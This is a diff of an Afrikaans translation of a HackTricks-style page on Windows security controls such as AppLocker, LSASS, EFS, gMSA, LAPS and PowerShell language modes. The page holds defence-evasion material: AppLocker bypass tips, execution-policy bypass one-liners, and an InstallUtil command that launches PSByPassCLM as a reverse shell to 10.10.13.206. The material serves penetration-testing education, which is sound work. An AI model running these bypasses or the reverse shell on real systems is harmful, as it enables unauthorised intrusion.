@@ -1,4 +1,4 @@
-# Windows Veiligheid Beheer
+# Windows Security Controls
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,13 +6,13 @@
 
 'n Aansoek witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om teenwoordig te wees en op 'n stelsel te loop. Die doel is om die omgewing te beskerm teen skadelike malware en nie-goedgekeurde sagteware wat nie ooreenstem met die spesifieke besigheidsbehoeftes van 'n organisasie nie.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **aansoek witlys oplossing** en gee stelselsadministrateurs beheer oor **watter aansoeke en lêers gebruikers kan uitvoer**. Dit bied **fynbeheer** oor uitvoerbare lêers, skripte, Windows-installer lêers, DLL's, verpakte aansoeke, en verpakte aansoek-installeerders.\
-Dit is algemeen dat organisasies **cmd.exe en PowerShell.exe** blokkeer en skryftoegang tot sekere gidse, **maar dit kan alles omseil word**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **aansoek witlys oplossing** en gee stelselsadministrateurs beheer oor **watter aansoeke en lêers gebruikers kan uitvoer**. Dit bied **fyn beheer** oor uitvoerbare lêers, skripte, Windows-installer lêers, DLL's, verpakte toepassings, en verpakte toepassingsinstalleerders.\
+Dit is algemeen dat organisasies **cmd.exe en PowerShell.exe** blokkeer en skrywe toegang tot sekere gidse, **maar dit kan alles omseil word**.
 
-### Kontroleer
+### Kontrole
 
-Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:
-```powershell
+Kontrole watter lêers/uitbreidings op die swartlys/witlys is:
+```bash
 Get-ApplockerPolicy -Effective -xml
 
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
@@ -37,26 +37,26 @@ C:\windows\tracing
 - **Sleg geskryfde reëls kan ook omseil word**
 - Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, jy kan 'n **map genaamd `allowed`** enige plek skep en dit sal toegelaat word.
 - Organisasies fokus ook dikwels op **die blokkeer van die `%System32%\WindowsPowerShell\v1.0\powershell.exe` uitvoerbare lêer**, maar vergeet van die **ander** [**PowerShell uitvoerbare plekke**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
-- **DLL afdwinging is baie selde geaktiveer** weens die ekstra las wat dit op 'n stelsel kan plaas, en die hoeveelheid toetsing wat benodig word om te verseker dat niks sal breek nie. So, die gebruik van **DLL's as agterdeure sal help om AppLocker te omseil**.
+- **DLL afdwinging is baie selde geaktiveer** weens die ekstra las wat dit op 'n stelsel kan plaas, en die hoeveelheid toetsing wat benodig word om te verseker dat niks sal breek nie. Dus sal die gebruik van **DLL's as agterdeure help om AppLocker te omseil**.
 - Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell** kode in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-## Kredensiaal Berging
+## Kredietbewaring
 
 ### Sekuriteitsrekeningbestuurder (SAM)
 
-Plaaslike kredensiale is teenwoordig in hierdie lêer, die wagwoorde is gehasht.
+Plaaslike krediete is teenwoordig in hierdie lêer, die wagwoorde is gehasht.
 
 ### Plaaslike Sekuriteitsowerheid (LSA) - LSASS
 
-Die **kredensiale** (gehasht) word **gestoor** in die **geheue** van hierdie subsisteem vir Enkelteken-in redes.\
+Die **krediete** (gehasht) word **gestoor** in die **geheue** van hierdie subsisteem vir Enkelteken-in redes.\
 **LSA** bestuur die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikersregte...), **verifikasie**, **toegangstokens**...\
-LSA sal die een wees wat sal **kontroleer** vir verskafde kredensiale binne die **SAM** lêer (vir 'n plaaslike aanmelding) en **praat** met die **domeinbeheerder** om 'n domein gebruiker te verifieer.
+LSA sal die een wees wat die **krediete** in die **SAM** lêer (vir 'n plaaslike aanmelding) sal **kontroleer** en met die **domeinbeheerder** sal **praat** om 'n domein gebruiker te verifieer.
 
-Die **kredensiale** word **gestoor** binne die **proses LSASS**: Kerberos kaartjies, hashes NT en LM, maklik ontcijferbare wagwoorde.
+Die **krediete** word **gestoor** binne die **proses LSASS**: Kerberos kaartjies, hashes NT en LM, maklik ontcijferbare wagwoorde.
 
 ### LSA geheime
 
-LSA kan sekere kredensiale op skyf stoor:
+LSA kan sommige krediete op skyf stoor:
 
 - Wagwoord van die rekenaarrekening van die Aktiewe Directory (onbereikbare domeinbeheerder).
 - Wagwoorde van die rekeninge van Windows dienste
@@ -65,7 +65,7 @@ LSA kan sekere kredensiale op skyf stoor:
 
 ### NTDS.dit
 
-Dit is die databasis van die Aktiewe Directory. Dit is slegs teenwoordig in Domein Beheerders.
+Dit is die databasis van die Aktiewe Directory. Dit is slegs teenwoordig in Domeinbeheerders.
 
 ## Defender
 
@@ -92,7 +92,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-Om dit te enumerate kan jy ook uitvoer:
+Om dit te evalueer, kan jy ook uitvoer:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -103,12 +103,12 @@ sc query windefend
 ```
 ## Encrypted File System (EFS)
 
-EFS beveilig lêers deur middel van versleuteling, wat 'n **simmetriese sleutel** gebruik wat bekend staan as die **Lêer Versleuteling Sleutel (FEK)**. Hierdie sleutel word versleuteld met die gebruiker se **publieke sleutel** en gestoor binne die versleutelde lêer se $EFS **alternatiewe datastroom**. Wanneer ontsleuteling nodig is, word die ooreenstemmende **privaat sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK uit die $EFS-stroom te ontsleutel. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) gevind word.
+EFS beveilig lêers deur middel van versleuteling, wat 'n **simmetriese sleutel** gebruik wat bekend staan as die **File Encryption Key (FEK)**. Hierdie sleutel word versleuteld met die gebruiker se **publieke sleutel** en gestoor binne die versleutelde lêer se $EFS **alternatiewe datastroom**. Wanneer ontsleuteling nodig is, word die ooreenstemmende **privaat sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK uit die $EFS-stroom te ontsleutel. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) gevind word.
 
 **Ontsleuteling scenario's sonder gebruiker inisiatief** sluit in:
 
 - Wanneer lêers of vouers na 'n nie-EFS lêerstelsel, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), verskuif word, word hulle outomaties ontsleutel.
-- Versleutelde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor oordrag ontsleutel.
+- Versleutelde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor transmissie ontsleutel.
 
 Hierdie versleutelingmetode stel **deursigtige toegang** tot versleutelde lêers vir die eienaar in staat. Dit is egter nie moontlik om eenvoudig die eienaar se wagwoord te verander en in te log om ontsleuteling toe te laat nie.
 
@@ -116,7 +116,7 @@ Hierdie versleutelingmetode stel **deursigtige toegang** tot versleutelde lêers
 
 - EFS gebruik 'n simmetriese FEK, versleuteld met die gebruiker se publieke sleutel.
 - Ontsleuteling gebruik die gebruiker se privaat sleutel om toegang tot die FEK te verkry.
-- Outomatiese ontsleuteling vind plaas onder spesifieke omstandighede, soos om na FAT32 te kopieer of netwerk oordrag.
+- Outomatiese ontsleuteling vind plaas onder spesifieke toestande, soos om na FAT32 te kopieer of netwerk transmissie.
 - Versleutelde lêers is toeganklik vir die eienaar sonder addisionele stappe.
 
 ### Check EFS info
@@ -140,13 +140,13 @@ https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 
 ## Group Managed Service Accounts (gMSA)
 
-Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastruktuur te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die "**Wagwoord verval nooit**" instelling geaktiveer het, bied gMSA's 'n veiliger en meer hanteerbare oplossing:
+Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die "**Wagwoord verval nooit**" instelling geaktiveer het, bied gMSA's 'n veiliger en meer hanteerbare oplossing:
 
-- **Outomatiese Wagwoordbestuur**: gMSA's gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens domein of rekenaarbeleid. Hierdie proses word deur Microsoft se Sleutelverspreidingsdiens (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
+- **Outomatiese Wagwoordbestuur**: gMSA's gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens domein of rekenaarbeleid. Hierdie proses word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
 - **Verbeterde Sekuriteit**: Hierdie rekeninge is immuun teen vergrendeling en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verbeter.
 - **Meervoudige Gasheerondersteuning**: gMSA's kan oor verskeie gasheers gedeel word, wat hulle ideaal maak vir dienste wat op verskeie bedieners loop.
-- **Geplande Taakvermoë**: Anders as bestuurde diensrekeninge, ondersteun gMSA's die uitvoering van geplande take.
-- **Vereenvoudigde SPN-bestuur**: Die stelsel werk outomaties die Diens Prinsipaal Naam (SPN) by wanneer daar veranderinge aan die rekenaar se sAMaccount besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.
+- **Geskeduleerde Taakvermoë**: Anders as bestuurde diensrekeninge, ondersteun gMSA's die uitvoering van geskeduleerde take.
+- **Vereenvoudigde SPN-bestuur**: Die stelsel werk outomaties die Service Principal Name (SPN) by wanneer daar veranderinge aan die rekenaar se sAMaccount besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.
 
 Die wagwoorde vir gMSA's word in die LDAP eienskap _**msDS-ManagedPassword**_ gestoor en word outomaties elke 30 dae deur Domein Beheerders (DC's) gereset. Hierdie wagwoord, 'n versleutelde datablad bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA's geïnstalleer is, verkry word, wat 'n veilige omgewing verseker. Om toegang tot hierdie inligting te verkry, is 'n beveiligde verbinding soos LDAPS nodig, of die verbinding moet geverifieer word met 'Sealing & Secure'.
 
@@ -173,23 +173,23 @@ Die **Local Administrator Password Solution (LAPS)**, beskikbaar vir aflaai van 
 PowerShell [**Beperkte Taalmodus**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die funksies** wat nodig is om PowerShell effektief te gebruik, soos die blokkering van COM-objekte, slegs goedgekeurde .NET tipes, XAML-gebaseerde werksvloeie, PowerShell klasse, en meer, af.
 
 ### **Kontroleer**
-```powershell
+```bash
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
 ```
 ### Omseil
-```powershell
+```bash
 #Easy bypass
 Powershell -version 2
 ```
-In huidige Windows sal daardie Bypass nie werk nie, maar jy kan gebruik maak van [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**Om dit te kompileer mag jy** **moet** _**'n Verwysing Voeg**_ -> _Blader_ -> _Blader_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.
+In huidige Windows sal daardie omseiling nie werk nie, maar jy kan [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
+**Om dit te kompileer, mag jy** **moet** _**'n Verwysing Voeg**_ -> _Blader_ -> _Blader_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.
 
-#### Direkte bypass:
+#### Direkte omseiling:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-#### Omgekeerde skulp:
+#### Terugskakel:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -198,7 +198,7 @@ U kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/m
 ## PS Uitvoeringsbeleid
 
 Standaard is dit op **beperk.** Hoofmaniere om hierdie beleid te omseil:
-```powershell
+```bash
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
 Get-Content .runme.ps1 | PowerShell.exe -noprofile -
@@ -223,7 +223,7 @@ Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-executi
 
 Is die API wat gebruik kan word om gebruikers te autentiseer.
 
-Die SSPI sal verantwoordelik wees vir die vind van die toepaslike protokol vir twee masjiene wat wil kommunikeer. Die verkieslike metode hiervoor is Kerberos. Dan sal die SSPI onderhandel watter autentifikasieprotokol gebruik sal word, hierdie autentifikasieprotokolle word Security Support Provider (SSP) genoem, is binne elke Windows-masjien in die vorm van 'n DLL geleë en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.
+Die SSPI sal verantwoordelik wees vir die vind van die toepaslike protokol vir twee masjiene wat wil kommunikeer. Die verkieslike metode hiervoor is Kerberos. Dan sal die SSPI onderhandel watter autentiseringsprotokol gebruik sal word, hierdie autentiseringsprotokolle word Security Support Provider (SSP) genoem, is binne elke Windows-masjien in die vorm van 'n DLL geleë en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.
 
 ### Hoof SSPs
 
@@ -240,9 +240,9 @@ Die SSPI sal verantwoordelik wees vir die vind van die toepaslike protokol vir t
 
 #### Die onderhandeling kan verskeie metodes of slegs een bied.
 
-## UAC - User Account Control
+## UAC - Gebruikersrekeningbeheer
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingsprompt vir verhoogde aktiwiteite** moontlik maak.
+[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingsprompt vir verhoogde aktiwiteite** moontlik maak.
 
 {{#ref}}
 uac-user-account-control.md
